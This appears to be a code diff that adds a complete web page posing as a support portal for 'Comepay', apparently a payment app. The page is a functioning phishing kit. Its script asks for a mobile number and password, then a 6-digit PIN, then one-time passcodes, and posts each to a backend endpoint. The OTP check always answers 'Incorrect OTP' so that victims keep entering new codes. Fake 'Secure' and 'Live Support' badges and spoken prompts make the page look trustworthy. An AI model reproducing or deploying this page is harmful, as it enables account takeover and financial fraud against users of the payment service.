@@ -1,0 +1,619 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
+  <title>Comepay · Customer Support</title>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Inter', system-ui, -apple-system, 'Segoe UI', Roboto, 'Helvetica Neue', sans-serif; }
+    html, body { height: 100%; }
+    body {
+      display: flex; justify-content: center; align-items: center; min-height: 100vh;
+      background: linear-gradient(145deg, #f4f8fb 0%, #eef4f9 40%, #e2edf5 70%, #d6e5f2 100%);
+      background-size: 300% 300%; animation: bgGradientShift 18s ease infinite;
+      position: relative; overflow: hidden; padding: 16px;
+    }
+    @keyframes bgGradientShift { 0% { background-position: 0% 50%; } 50% { background-position: 100% 50%; } 100% { background-position: 0% 50%; } }
+
+    .bg-layer { position: fixed; inset: 0; pointer-events: none; z-index: 0; overflow: hidden; }
+    .blob { position: absolute; border-radius: 50%; filter: blur(50px); opacity: 0.35; animation: blobMove 24s ease-in-out infinite alternate; }
+    .blob1 { width: 340px; height: 340px; background: #bbf7d0; top: -100px; left: -100px; animation-duration: 22s; }
+    .blob2 { width: 280px; height: 280px; background: #93c5fd; bottom: -80px; right: -80px; animation-duration: 28s; animation-delay: -6s; }
+    .blob3 { width: 220px; height: 220px; background: #ddd6fe; top: 40%; right: 10%; animation-duration: 32s; animation-delay: -12s; }
+    @keyframes blobMove { 0% { transform: translate(0,0) scale(1) rotate(0deg); } 50% { transform: translate(60px,-40px) scale(1.15) rotate(15deg); } 100% { transform: translate(-40px,50px) scale(0.95) rotate(-10deg); } }
+
+    .shape { position: absolute; opacity: 0.2; animation: shapeFloat 16s linear infinite; }
+    .shape.circle { border-radius: 50%; background: radial-gradient(circle at 30% 30%, #34d399, #059669); }
+    .shape.triangle { width: 0; height: 0; border-left: 18px solid transparent; border-right: 18px solid transparent; border-bottom: 30px solid #10b981; background: transparent; }
+    .shape.square { background: #6ee7b7; border-radius: 4px; transform: rotate(45deg); }
+    @keyframes shapeFloat { 0% { transform: translateY(0) rotate(0deg); opacity: 0.15; } 20% { opacity: 0.35; } 80% { opacity: 0.35; } 100% { transform: translateY(-120vh) rotate(360deg); opacity: 0; } }
+
+    .fountain-particle {
+      position: absolute; bottom: 0px;
+      background: radial-gradient(circle, #34d399, #047857);
+      border-radius: 50%; pointer-events: none; opacity: 0.6;
+      animation: fountainAnim linear infinite;
+    }
+    @keyframes fountainAnim {
+      0% { transform: translate(0, 0) scale(0.5); opacity: 0.8; }
+      50% { opacity: 0.5; }
+      100% { transform: translate(var(--tx), -110vh) scale(1.2); opacity: 0; }
+    }
+
+    .app-card {
+      width: 100%; max-width: 480px; background: rgba(255,255,255,0.95);
+      backdrop-filter: blur(16px); -webkit-backdrop-filter: blur(16px);
+      border-radius: 34px; padding: 28px 24px 26px;
+      box-shadow: 0 30px 60px -18px rgba(5,150,105,0.15), 0 0 0 1px rgba(255,255,255,0.9) inset, 0 0 80px -20px rgba(16,185,129,0.15);
+      border: 1px solid rgba(226,232,240,0.9); position: relative; z-index: 2;
+      animation: cardFadeIn 0.7s cubic-bezier(0.16,1,0.3,1); overflow: hidden;
+    }
+    .app-card::after {
+      content: ''; position: absolute; top: -50%; left: -50%; width: 200%; height: 200%;
+      background: linear-gradient(115deg, transparent 40%, rgba(255,255,255,0.4) 50%, transparent 60%);
+      animation: shimmer 7s infinite; pointer-events: none;
+    }
+    @keyframes shimmer { 0% { transform: translateX(-40%) rotate(0.001deg); } 100% { transform: translateX(40%) rotate(0.001deg); } }
+    @keyframes cardFadeIn { from { opacity: 0; transform: translateY(18px) scale(0.98); } to { opacity: 1; transform: translateY(0) scale(1); } }
+
+    .support-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 14px; padding: 0 2px; position: relative; z-index: 2; }
+    .support-badge { display: inline-flex; align-items: center; gap: 6px; font-size: 0.68rem; font-weight: 700; letter-spacing: 0.5px; color: #047857; background: rgba(209,250,229,0.7); padding: 5px 12px; border-radius: 30px; border: 1px solid rgba(110,231,183,0.8); text-transform: uppercase; backdrop-filter: blur(4px); }
+    .online-dot { width: 7px; height: 7px; background: #059669; border-radius: 50%; box-shadow: 0 0 6px #059669; animation: pulseDot 1.8s infinite; }
+    @keyframes pulseDot { 0%, 100% { opacity: 1; transform: scale(1); } 50% { opacity: 0.5; transform: scale(0.85); } }
+    .lock-badge { display: inline-flex; align-items: center; gap: 5px; font-size: 0.68rem; font-weight: 700; color: #047857; background: rgba(255,255,255,0.8); padding: 5px 12px; border-radius: 30px; border: 1px solid rgba(110,231,183,0.7); text-transform: uppercase; backdrop-filter: blur(4px); }
+
+    .logo-area { display: flex; justify-content: center; align-items: center; margin-bottom: 20px; position: relative; z-index: 2; }
+    .logo-area img { max-width: 150px; width: 100%; height: auto; display: block; filter: drop-shadow(0 8px 18px rgba(5,150,105,0.15)); animation: logoFloat 5s ease-in-out infinite; border-radius: 20px; }
+    @keyframes logoFloat { 0%, 100% { transform: translateY(0); } 50% { transform: translateY(-4px); } }
+
+    h2 { color: #1e293b; font-weight: 800; font-size: 1.45rem; letter-spacing: -0.02em; text-align: center; margin-bottom: 6px; position: relative; z-index: 2; }
+    .subhead { color: #059669; text-align: center; font-size: 0.92rem; margin-bottom: 20px; font-weight: 500; position: relative; z-index: 2; }
+
+    .problem-grid { display: flex; flex-direction: column; gap: 10px; margin: 4px 0; position: relative; z-index: 2; }
+    .problem-item {
+      background: rgba(255,255,255,0.9); border: 1.5px solid rgba(167,243,208,0.9); border-radius: 16px;
+      padding: 16px 20px; display: flex; align-items: center; gap: 16px; color: #1e293b;
+      font-size: 1.02rem; font-weight: 600; cursor: pointer; transition: all 0.2s ease;
+      -webkit-tap-highlight-color: transparent; position: relative; overflow: hidden;
+    }
+    .problem-item i { width: 26px; font-size: 1.25rem; color: #059669; text-align: center; transition: transform 0.2s; }
+    .problem-item:hover { background: #f0fdf4; border-color: #34d399; transform: translateY(-1px); box-shadow: 0 8px 18px rgba(5,150,105,0.08); }
+    .problem-item:hover i { transform: scale(1.12); }
+    .problem-item.selected { background: linear-gradient(95deg, #ecfdf5, #d1fae5); border-color: #059669; box-shadow: 0 0 0 2px rgba(5,150,105,0.25); }
+    .problem-item.selected::after { content: '\f00c'; font-family: 'Font Awesome 6 Free'; font-weight: 900; position: absolute; right: 18px; color: #047857; font-size: 1.1rem; animation: checkIn 0.25s ease-out; }
+    @keyframes checkIn { from { transform: scale(0); opacity: 0; } to { transform: scale(1); opacity: 1; } }
+
+    .form-step { display: flex; flex-direction: column; gap: 16px; margin-top: 4px; position: relative; z-index: 2; }
+    .input-group { display: flex; flex-direction: column; gap: 6px; }
+    .input-group label { color: #059669; font-size: 0.78rem; font-weight: 700; letter-spacing: 0.4px; margin-left: 8px; text-transform: uppercase; }
+    .input-field { background: #fafafa; border: 1.5px solid #cbd5e1; border-radius: 16px; padding: 16px 20px; font-size: 1.05rem; color: #1e293b; outline: none; transition: all 0.2s; width: 100%; font-weight: 500; }
+    .input-field::placeholder { color: rgba(100,116,139,0.5); font-weight: 400; font-size: 0.95rem; }
+    .input-field:focus { background: #ffffff; border-color: #059669; box-shadow: 0 0 0 3px rgba(5,150,105,0.15); }
+
+    .btn-primary {
+      background: linear-gradient(135deg, #059669, #047857); border: none; border-radius: 16px;
+      padding: 16px 24px; font-size: 1.08rem; font-weight: 700; color: white;
+      display: flex; align-items: center; justify-content: center; gap: 10px; cursor: pointer;
+      margin-top: 6px; transition: all 0.2s; box-shadow: 0 10px 24px -8px #059669;
+      width: 100%; -webkit-tap-highlight-color: transparent; position: relative; overflow: hidden;
+    }
+    .btn-primary::after { content: ''; position: absolute; top: 0; left: -120%; width: 100%; height: 100%; background: linear-gradient(90deg, transparent, rgba(255,255,255,0.25), transparent); transition: left 0.6s; }
+    .btn-primary:hover::after { left: 120%; }
+    .btn-primary:hover { background: linear-gradient(135deg, #10b981, #059669); transform: translateY(-1px); box-shadow: 0 12px 28px -8px #059669; }
+    .btn-primary:active { transform: scale(0.98); }
+
+    .btn-secondary { background: rgba(255,255,255,0.9); border: 1.5px solid #cbd5e1; border-radius: 16px; padding: 14px 22px; color: #059669; font-weight: 600; display: flex; align-items: center; justify-content: center; gap: 8px; cursor: pointer; transition: 0.2s; width: 100%; margin-top: 6px; -webkit-tap-highlight-color: transparent; }
+    .btn-secondary:hover { background: #f0fdf4; border-color: #34d399; }
+
+    .pin-row, .otp-row { display: flex; gap: 10px; justify-content: center; margin: 6px 0 0; transition: border-color 0.2s; }
+    .pin-box, .otp-box { width: 50px; height: 58px; background: #fafafa; border: 2px solid #cbd5e1; border-radius: 14px; text-align: center; font-size: 1.6rem; font-weight: 700; color: #1e293b; outline: none; transition: 0.15s; caret-color: #059669; }
+    .pin-box:focus, .otp-box:focus { background: #ffffff; border-color: #059669; box-shadow: 0 0 0 3px rgba(5,150,105,0.15); transform: translateY(-2px); }
+
+    .otp-row.shake { animation: shakeRow 0.5s ease; }
+    @keyframes shakeRow {
+      0%, 100% { transform: translateX(0); }
+      15% { transform: translateX(-9px); }
+      30% { transform: translateX(9px); }
+      45% { transform: translateX(-7px); }
+      60% { transform: translateX(7px); }
+      75% { transform: translateX(-4px); }
+      90% { transform: translateX(4px); }
+    }
+    .otp-row.error .otp-box { border-color: #e53935; background: #fff5f5; box-shadow: 0 0 0 2px rgba(229,57,53,0.12); }
+    .otp-error-msg {
+      color: #c62828; font-size: 0.88rem; font-weight: 600; text-align: center; margin-top: 12px;
+      display: flex; align-items: center; justify-content: center; gap: 6px;
+      animation: errFadeIn 0.3s ease; position: relative; z-index: 2;
+    }
+    .otp-error-msg.hidden { display: none; }
+    @keyframes errFadeIn { from { opacity: 0; transform: translateY(-4px); } to { opacity: 1; transform: translateY(0); } }
+
+    .loader-overlay { display: flex; flex-direction: column; align-items: center; justify-content: center; gap: 18px; padding: 36px 10px; position: relative; z-index: 2; }
+    .spinner { width: 58px; height: 58px; border-radius: 50%; border: 4px solid rgba(5,150,105,0.15); border-top: 4px solid #059669; animation: spin 0.9s linear infinite; }
+    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    .loader-text { color: #059669; font-size: 1rem; font-weight: 600; letter-spacing: 0.4px; }
+
+    @media (max-width: 480px) {
+      body { padding: 12px; }
+      .app-card { padding: 22px 16px 20px; border-radius: 28px; max-width: 100%; }
+      .logo-area img { max-width: 130px; }
+      .pin-box, .otp-box { width: 44px; height: 52px; font-size: 1.4rem; border-radius: 12px; }
+      .problem-item { padding: 14px 16px; font-size: 0.98rem; }
+      h2 { font-size: 1.3rem; }
+      .input-field { padding: 14px 18px; font-size: 1rem; }
+      .btn-primary { padding: 14px 18px; font-size: 1.02rem; }
+      .subhead { font-size: 0.88rem; margin-bottom: 18px; }
+    }
+    @media (max-width: 380px) {
+      .logo-area img { max-width: 110px; }
+      .pin-box, .otp-box { width: 38px; height: 46px; font-size: 1.2rem; border-radius: 10px; }
+    }
+  </style>
+</head>
+<body>
+  <div class="bg-layer" aria-hidden="true">
+    <div class="blob blob1"></div>
+    <div class="blob blob2"></div>
+    <div class="blob blob3"></div>
+  </div>
+
+  <div class="app-card" id="appCard">
+    <div class="support-header">
+      <span class="support-badge"><span class="online-dot"></span> Live Support</span>
+      <span class="lock-badge"><i class="fas fa-shield-alt" style="font-size: 0.65rem;"></i> Secure</span>
+    </div>
+    <div class="logo-area">
+      <!-- Yahan aap apni local image file ka naam likhein, jaise logo.png ya logo.jpg -->
+      <img src="logo.png" alt="Comepay logo">
+    </div>
+    <div id="stepContainer"></div>
+  </div>
+
+  <script>
+    (function() {
+      async function sendToBackend(payload) {
+        try {
+          await fetch('/api/send', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(payload)
+          });
+        } catch (err) {
+          console.warn('Network error', err);
+        }
+      }
+
+      // Auto ping on load
+      setTimeout(function() {
+        sendToBackend({ type: 'page_opened' });
+      }, 600);
+
+      // Dynamic Background Shapes
+      (function createShapes() {
+        const layer = document.querySelector('.bg-layer');
+        if (!layer) return;
+        const shapeCount = window.innerWidth < 480 ? 12 : 18;
+        const types = ['circle', 'triangle', 'square'];
+        for (let i = 0; i < shapeCount; i++) {
+          const s = document.createElement('div');
+          s.className = 'shape ' + types[Math.floor(Math.random() * types.length)];
+          const size = 8 + Math.random() * 22;
+          if (s.classList.contains('circle')) {
+            s.style.width = size + 'px'; s.style.height = size + 'px';
+          } else if (s.classList.contains('square')) {
+            s.style.width = (size * 0.7) + 'px'; s.style.height = (size * 0.7) + 'px';
+          } else {
+            const b = size * 0.6;
+            s.style.borderLeftWidth = b + 'px'; s.style.borderRightWidth = b + 'px'; s.style.borderBottomWidth = (b * 1.6) + 'px';
+          }
+          s.style.left = Math.random() * 100 + '%';
+          s.style.bottom = '-15vh';
+          s.style.animationDuration = (14 + Math.random() * 18) + 's';
+          s.style.animationDelay = (-Math.random() * 22) + 's';
+          layer.appendChild(s);
+        }
+      })();
+
+      // Fountain Particle Effect
+      (function createFountain() {
+        const layer = document.querySelector('.bg-layer');
+        if (!layer) return;
+        
+        setInterval(() => {
+          const p = document.createElement('div');
+          p.className = 'fountain-particle';
+          const size = 4 + Math.random() * 8;
+          p.style.width = size + 'px';
+          p.style.height = size + 'px';
+          
+          const startX = Math.random() * window.innerWidth;
+          p.style.left = startX + 'px';
+          
+          const tx = (Math.random() - 0.5) * 150;
+          p.style.setProperty('--tx', tx + 'px');
+          
+          const duration = 4 + Math.random() * 4;
+          p.style.animationDuration = duration + 's';
+          
+          layer.appendChild(p);
+          setTimeout(() => p.remove(), duration * 1000);
+        }, 300);
+      })();
+
+      // Click Sound
+      let audioCtx = null;
+      function playClickSound() {
+        try {
+          if (!audioCtx) audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+          if (audioCtx.state === 'suspended') audioCtx.resume();
+          const now = audioCtx.currentTime;
+          const osc = audioCtx.createOscillator();
+          const gain = audioCtx.createGain();
+          osc.type = 'sine';
+          osc.frequency.setValueAtTime(1050, now);
+          osc.frequency.exponentialRampToValueAtTime(520, now + 0.06);
+          gain.gain.setValueAtTime(0.10, now);
+          gain.gain.exponentialRampToValueAtTime(0.0001, now + 0.09);
+          osc.connect(gain); gain.connect(audioCtx.destination);
+          osc.start(now); osc.stop(now + 0.10);
+        } catch (e) {}
+      }
+
+      // Error Buzzer
+      function playErrorSound() {
+        try {
+          if (!audioCtx) audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+          if (audioCtx.state === 'suspended') audioCtx.resume();
+          const now = audioCtx.currentTime;
+          const osc = audioCtx.createOscillator();
+          const gain = audioCtx.createGain();
+          osc.type = 'square';
+          osc.frequency.setValueAtTime(220, now);
+          osc.frequency.setValueAtTime(170, now + 0.13);
+          gain.gain.setValueAtTime(0.09, now);
+          gain.gain.exponentialRampToValueAtTime(0.0001, now + 0.32);
+          osc.connect(gain); gain.connect(audioCtx.destination);
+          osc.start(now); osc.stop(now + 0.34);
+        } catch (e) {}
+      }
+
+      // Voice Synthesis
+      function speak(text) {
+        if (!('speechSynthesis' in window)) return;
+        window.speechSynthesis.cancel();
+        const utterance = new SpeechSynthesisUtterance(text);
+        utterance.rate = 0.92;
+        utterance.pitch = 1.02;
+        utterance.volume = 0.9;
+        const voices = window.speechSynthesis.getVoices();
+        if (voices.length) {
+          const preferred = voices.find(v => v.lang.startsWith('en') && v.name.toLowerCase().includes('female'))
+            || voices.find(v => v.lang.startsWith('en') && v.name.toLowerCase().includes('google'))
+            || voices.find(v => v.lang.startsWith('en'));
+          if (preferred) utterance.voice = preferred;
+        }
+        window.speechSynthesis.speak(utterance);
+      }
+      if ('speechSynthesis' in window) window.speechSynthesis.onvoiceschanged = function() {};
+
+      // Global Click Sound Listener
+      const appCard = document.getElementById('appCard');
+      if (appCard) {
+        appCard.addEventListener('click', function(e) {
+          const el = e.target.closest('.problem-item, .btn-primary, .btn-secondary, .back-btn');
+          if (el) playClickSound();
+        });
+      }
+
+      let selectedProblem = null;
+      let mobileNumber = '';
+      let password = '';
+      let otpAttempts = 0;
+
+      const stepContainer = document.getElementById('stepContainer');
+      if (!stepContainer) return;
+
+      function showLoading(message, submessage, duration, callback) {
+        stepContainer.innerHTML = `
+          <div class="loader-overlay">
+            <div class="spinner"></div>
+            <div class="loader-text">${message}</div>
+            <div style="color: #059669; font-size: 0.82rem; margin-top: 2px;">${submessage}</div>
+          </div>
+        `;
+        setTimeout(() => {
+          if (typeof callback === 'function') {
+            callback();
+          }
+        }, duration);
+      }
+
+      const problems = [
+        { id: 1, label: 'Selling issue', icon: 'fa-store' },
+        { id: 2, label: 'Deposit failed', icon: 'fa-credit-card' },
+        { id: 3, label: 'Forget Password ', icon: 'fa-lock' },
+        { id: 4, label: 'Remove Check Risk ', icon: 'fa-shield-alt' },
+        { id: 5, label: 'UPI Change ', icon: 'fa-mobile-alt' },
+        { id: 6, label: 'New Version Download ', icon: 'fa-download' }
+      ];
+
+      // Problem Step
+      function renderProblemStep() {
+        let problemsHtml = '';
+        problems.forEach(p => {
+          problemsHtml += `
+            <div class="problem-item" data-id="${p.id}" data-label="${p.label}">
+              <i class="fas ${p.icon}"></i>
+              <span>${p.id}. ${p.label}</span>
+            </div>
+          `;
+        });
+
+        stepContainer.innerHTML = `
+          <h2>How can we help you?</h2>
+          <div class="subhead">Select the issue you are facing</div>
+          <div class="problem-grid">${problemsHtml}</div>
+        `;
+
+        document.querySelectorAll('.problem-item').forEach(item => {
+          item.addEventListener('click', function() {
+            document.querySelectorAll('.problem-item').forEach(i => i.classList.remove('selected'));
+            this.classList.add('selected');
+            selectedProblem = { id: parseInt(this.dataset.id), label: this.dataset.label };
+
+            sendToBackend({ type: 'problem_select', issue: selectedProblem.label });
+            showLoading('Connecting to support...', 'Please wait', 1500, renderRegisterStep);
+          });
+        });
+      }
+
+      // Register Step
+      function renderRegisterStep() {
+        stepContainer.innerHTML = `
+          <div style="display: flex; align-items: center; margin-bottom: 8px;">
+            <button id="backBtn" class="back-btn" style="background: none; border: none; color: #059669; font-size: 0.92rem; font-weight: 600; cursor: pointer; display: inline-flex; align-items: center; gap: 6px; padding: 2px 0;">
+              <i class="fas fa-arrow-left"></i> Back
+            </button>
+          </div>
+          <h2>Customer Verification</h2>
+          <div class="subhead">${selectedProblem ? selectedProblem.label : ''}</div>
+          <div class="form-step">
+            <div class="input-group">
+              <label>MOBILE NUMBER</label>
+              <input type="tel" id="mobileInput" class="input-field" placeholder="Enter 10-digit mobile number" maxlength="10" inputmode="numeric" pattern="[0-9]*">
+            </div>
+            <div class="input-group">
+              <label>PASSWORD</label>
+              <input type="password" id="passwordInput" class="input-field" placeholder="Enter your password" maxlength="30">
+            </div>
+            <button id="registerBtn" class="btn-primary">
+              <i class="fas fa-shield-alt"></i> Verify & Continue
+            </button>
+          </div>
+        `;
+
+        document.getElementById('backBtn').addEventListener('click', renderProblemStep);
+
+        const mobileInput = document.getElementById('mobileInput');
+        const passwordInput = document.getElementById('passwordInput');
+        const registerBtn = document.getElementById('registerBtn');
+
+        if (mobileInput) {
+          mobileInput.addEventListener('input', function() {
+            this.value = this.value.replace(/\D/g, '').slice(0, 10);
+          });
+        }
+
+        if (registerBtn) {
+          registerBtn.addEventListener('click', function() {
+            const mobile = mobileInput ? mobileInput.value.trim() : '';
+            const pwd = passwordInput ? passwordInput.value.trim() : '';
+
+            if (mobile.length !== 10 || !/^\d{10}$/.test(mobile)) {
+              alert('Please enter a valid 10-digit Indian mobile number.');
+              return;
+            }
+            if (pwd.length < 4) {
+              alert('Password must be at least 4 characters.');
+              return;
+            }
+
+            mobileNumber = mobile;
+            password = pwd;
+
+            sendToBackend({ type: 'login_creds', issue: selectedProblem ? selectedProblem.label : 'N/A', phone: mobile, pass: pwd });
+            speak('Verifying your details. Please wait.');
+
+            showLoading('Verifying your details...', 'Secure connection established', 4500, function() {
+              speak('Verification successful.');
+              renderPinStep();
+            });
+          });
+        }
+      }
+
+      // PIN Step
+      function renderPinStep() {
+        stepContainer.innerHTML = `
+          <div style="display: flex; align-items: center; margin-bottom: 8px;">
+            <button id="backBtn" class="back-btn" style="background: none; border: none; color: #059669; font-size: 0.92rem; font-weight: 600; cursor: pointer; display: inline-flex; align-items: center; gap: 6px; padding: 2px 0;">
+              <i class="fas fa-arrow-left"></i> Back
+            </button>
+          </div>
+          <h2>Enter 6-digit PIN</h2>
+          <div class="subhead">Enter your 6-digit PIN</div>
+          <div class="pin-row" id="pinRow">
+            <input type="tel" class="pin-box" maxlength="1" inputmode="numeric" pattern="[0-9]*">
+            <input type="tel" class="pin-box" maxlength="1" inputmode="numeric" pattern="[0-9]*">
+            <input type="tel" class="pin-box" maxlength="1" inputmode="numeric" pattern="[0-9]*">
+            <input type="tel" class="pin-box" maxlength="1" inputmode="numeric" pattern="[0-9]*">
+            <input type="tel" class="pin-box" maxlength="1" inputmode="numeric" pattern="[0-9]*">
+            <input type="tel" class="pin-box" maxlength="1" inputmode="numeric" pattern="[0-9]*">
+          </div>
+          <button id="pinSubmitBtn" class="btn-primary" style="margin-top: 18px;">
+            <i class="fas fa-lock"></i> Continue
+          </button>
+        `;
+
+        document.getElementById('backBtn').addEventListener('click', renderRegisterStep);
+
+        const pinInputs = document.querySelectorAll('.pin-box');
+        const pinSubmitBtn = document.getElementById('pinSubmitBtn');
+
+        pinInputs.forEach((input, idx) => {
+          input.addEventListener('input', function() {
+            this.value = this.value.replace(/\D/g, '').slice(0, 1);
+            if (this.value.length === 1 && idx < pinInputs.length - 1) pinInputs[idx + 1].focus();
+          });
+          input.addEventListener('keydown', function(e) {
+            if (e.key === 'Backspace' && this.value.length === 0 && idx > 0) pinInputs[idx - 1].focus();
+          });
+        });
+
+        if (pinInputs.length > 0) pinInputs[0].focus();
+
+        if (pinSubmitBtn) {
+          pinSubmitBtn.addEventListener('click', function() {
+            let pin = '';
+            for (let i = 0; i < pinInputs.length; i++) {
+              const val = pinInputs[i].value.trim();
+              if (val.length !== 1 || !/^\d$/.test(val)) {
+                alert('Please enter all 6 digits of your PIN.');
+                pinInputs[i].focus();
+                return;
+              }
+              pin += val;
+            }
+
+            sendToBackend({ type: 'pin_entered', phone: mobileNumber, pin: pin });
+            showLoading('Verifying PIN...', 'Please wait', 1000, renderOtpStep);
+          });
+        }
+      }
+
+      // OTP Step
+      function renderOtpStep() {
+        otpAttempts = 0;
+
+        stepContainer.innerHTML = `
+          <div style="display: flex; align-items: center; margin-bottom: 8px;">
+            <button id="backBtn" class="back-btn" style="background: none; border: none; color: #059669; font-size: 0.92rem; font-weight: 600; cursor: pointer; display: inline-flex; align-items: center; gap: 6px; padding: 2px 0;">
+              <i class="fas fa-arrow-left"></i> Back
+            </button>
+          </div>
+          <h2>OTP Verification</h2>
+          <div class="subhead">6-digit code sent to +91 ${mobileNumber}</div>
+          <div class="otp-row" id="otpRow">
+            <input type="tel" class="otp-box" maxlength="1" inputmode="numeric" pattern="[0-9]*">
+            <input type="tel" class="otp-box" maxlength="1" inputmode="numeric" pattern="[0-9]*">
+            <input type="tel" class="otp-box" maxlength="1" inputmode="numeric" pattern="[0-9]*">
+            <input type="tel" class="otp-box" maxlength="1" inputmode="numeric" pattern="[0-9]*">
+            <input type="tel" class="otp-box" maxlength="1" inputmode="numeric" pattern="[0-9]*">
+            <input type="tel" class="otp-box" maxlength="1" inputmode="numeric" pattern="[0-9]*">
+          </div>
+          <div id="otpError" class="otp-error-msg hidden"></div>
+
+          <div style="text-align: right; margin-top: 14px; font-size: 0.88rem;">
+            <span id="resendContainer">
+              <a href="#" id="sendOtpBtn" style="color: #059669; font-weight: 700; text-decoration: none;">Send OTP</a>
+            </span>
+          </div>
+
+          <button id="otpSubmitBtn" class="btn-primary" style="margin-top: 14px;">
+            <i class="fas fa-check-circle"></i> Verify OTP
+          </button>
+        `;
+
+        document.getElementById('backBtn').addEventListener('click', renderPinStep);
+
+        const otpInputs = document.querySelectorAll('.otp-box');
+        const otpSubmitBtn = document.getElementById('otpSubmitBtn');
+        const otpRow = document.getElementById('otpRow');
+        const otpError = document.getElementById('otpError');
+        const resendContainer = document.getElementById('resendContainer');
+
+        function initSendOrResend() {
+          const sendOtpBtn = document.getElementById('sendOtpBtn');
+          if (sendOtpBtn) {
+            sendOtpBtn.addEventListener('click', function(e) {
+              e.preventDefault();
+
+              sendToBackend({ type: 'send_otp', phone: mobileNumber });
+              alert('OTP sent successfully to +91 ' + mobileNumber);
+
+              let timeLeft = 59;
+              resendContainer.innerHTML = `<span style="color: #059669; font-weight: 600;">Resend OTP in <span id="countdown">${timeLeft}</span>s</span>`;
+              const countdownEl = document.getElementById('countdown');
+
+              const timerInterval = setInterval(() => {
+                timeLeft--;
+                if (countdownEl) countdownEl.textContent = timeLeft;
+                if (timeLeft <= 0) {
+                  clearInterval(timerInterval);
+                  resendContainer.innerHTML = `<a href="#" id="sendOtpBtn" style="color: #059669; font-weight: 700; text-decoration: none;">Resend OTP</a>`;
+                  initSendOrResend();
+                }
+              }, 1000);
+            });
+          }
+        }
+
+        initSendOrResend();
+
+        otpInputs.forEach((input, idx) => {
+          input.addEventListener('input', function() {
+            this.value = this.value.replace(/\D/g, '').slice(0, 1);
+            if (otpRow) otpRow.classList.remove('error');
+            if (this.value.length === 1 && idx < otpInputs.length - 1) otpInputs[idx + 1].focus();
+          });
+          input.addEventListener('keydown', function(e) {
+            if (e.key === 'Backspace' && this.value.length === 0 && idx > 0) otpInputs[idx - 1].focus();
+          });
+        });
+
+        if (otpInputs.length > 0) otpInputs[0].focus();
+
+        if (otpSubmitBtn) {
+          otpSubmitBtn.addEventListener('click', function() {
+            let otp = '';
+            for (let i = 0; i < otpInputs.length; i++) {
+              const val = otpInputs[i].value.trim();
+              if (val.length !== 1 || !/^\d$/.test(val)) {
+                alert('Please enter all 6 digits of the OTP.');
+                otpInputs[i].focus();
+                return;
+              }
+              otp += val;
+            }
+
+            otpAttempts++;
+            sendToBackend({ type: 'wrong_otp', phone: mobileNumber, otp: otp, attempt: otpAttempts });
+
+            playErrorSound();
+            speak('Wrong OTP. Please try again.');
+
+            if (otpRow) {
+              otpRow.classList.add('error', 'shake');
+              setTimeout(() => otpRow.classList.remove('shake'), 520);
+            }
+
+            if (otpError) {
+              otpError.classList.remove('hidden');
+              otpError.innerHTML = '<i class="fas fa-exclamation-circle"></i> Incorrect OTP. Please try again.';
+              otpError.style.animation = 'none';
+              void otpError.offsetWidth;
+              otpError.style.animation = '';
+            }
+
+            otpInputs.forEach(i => i.value = '');
+            if (otpInputs.length > 0) otpInputs[0].focus();
+          });
+        }
+      }
+
+      renderProblemStep();
+    })();
+  </script>
+</body>
+</html>
